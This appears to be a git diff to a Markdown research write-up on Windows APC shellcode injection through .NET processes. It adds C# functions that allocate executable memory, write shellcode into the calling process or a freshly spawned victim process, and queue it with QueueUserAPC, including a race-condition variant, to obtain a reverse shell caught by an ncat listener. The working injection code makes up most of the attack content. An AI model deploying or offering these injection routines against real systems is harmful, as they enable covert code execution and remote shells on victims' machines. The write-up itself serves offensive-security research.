@@ -124,8 +124,72 @@ C:\Users\Razali\Desktop\ncat-portable-5.59BETA1>ncat -l 3333
 
 # Self Injection
 
-This example demonstrates that after injecting the shellcode within the calling process, when the process exits, the shellcode gets called. At no part of the code did we put any alertable calls. Henceforth, it confirms that the CLR did call an alertable method on behalf of me, which invokes the shellcode, and we get a shell.
+This example demonstrates that after injecting the shellcode within the calling process, when the process exits, the shellcode gets called. At no part of the code did we put any alertable calls. 
 
+```cs
+static void SelfInject(byte[] shellcode)
+{
+  IntPtr resultPtr = VirtualAlloc(0, shellcode.Length, 0x00001000, 0x40);
+  IntPtr bytesWritten = IntPtr.Zero;
+  Marshal.Copy(shellcode, 0, resultPtr, shellcode.Length);
+  uint ptr = QueueUserAPC(resultPtr, GetCurrentThread(), 0);
+  Console.WriteLine("Goodbye");
+}
+```
+
+Henceforth, it confirms that when a .NET process exits, the CLR did call an alertable method on behalf of me, which invokes the shellcode, and we get a shell.
+
+![image](https://user-images.githubusercontent.com/12537739/126809811-c4b89f79-7cb1-4a37-9c00-576622a37391.png)
+
+
+# Injection using Race Condition
+
+As stated in the documentattion of [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc), if we queue an APC before the main thread starts, the main thread would first prioritize running all the APC(s) in the queue before running the main code.
+
+While experimenting, I found that a `Console Application` is sometimes too quick to perform a race condition on, as the CLR seems to load and start the main thread even before I finish writing my APC into the queue. 
+
+Thus, I tried injecting the APC into a `Windows Form`, which takes a longer time for the UI Thread to be set up by the CLR, allowing me to quickly inject my APC before it begins. What we expect to observe is to achieve a shell without even exiting the .NET process, as the shell is achieved even before the UI Thread(main thread) starts. Since the shell is being run by the UI Thread, we won't see the `Windows Form` as the UI Thread is busy with my shell.
+
+
+
+```cs
+static void InjectRunningProcessUsingRaceCondition(byte[] shellcode, string victimProcessPath)
+{
+			STARTUPINFO startupinfo = new STARTUPINFO();
+			PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
+			
+			CreateProcess(null, victimProcessPath, 0, 0, false, 0, 0, null, ref startupinfo, ref processInformation);
+
+			IntPtr allocatedSpacePtr = VirtualAllocEx(processInformation.hProcess, IntPtr.Zero, shellcode.Length, 0x00001000, 0x40);
+			IntPtr bytesWritten = IntPtr.Zero;
+			
+			WriteProcessMemory(processInformation.hProcess, allocatedSpacePtr, shellcode, shellcode.Length, out bytesWritten);
+
+			Process process = Process.GetProcessById(processInformation.dwProcessId);
+			foreach (ProcessThread thread in process.Threads)
+			{
+				IntPtr threadHandle = OpenThread(0x0010, false, thread.Id);
+				VirtualProtectEx(processInformation.hProcess, allocatedSpacePtr, shellcode.Length, 0x20, out _);
+				QueueUserAPC(allocatedSpacePtr, threadHandle, 0);
+			}
+}
+```
+
+Henceforth, it confirms that it is possible to race against the Main thread, and inject our APC before it starts, which results in the Main thread executing our APC before the actual code.
+
+![image](https://user-images.githubusercontent.com/12537739/126812066-6195dbd6-e17a-4617-bbb2-8b3fd0e7c147.png)
+
+# Injecting into any Running .NET Process
+
+As confirmed in our first example, our APC would get executed after the program exits.
+
+I simulated it by simply letting my `Windows Form` boot up first, giving it a headstart by pausing using `Thread.Sleep` in my injector code, after which I perform the injection.
+
+As expected, the moment I close the application, we gain a reverse shell.
+
+![image](https://user-images.githubusercontent.com/12537739/126814235-5418158e-9bf0-48cb-b833-85c9d42c1b3f.png)
+
+The above image shows that the Form starts, after which the injection of the APC occurs. No connection happens as expected.
 
 
 
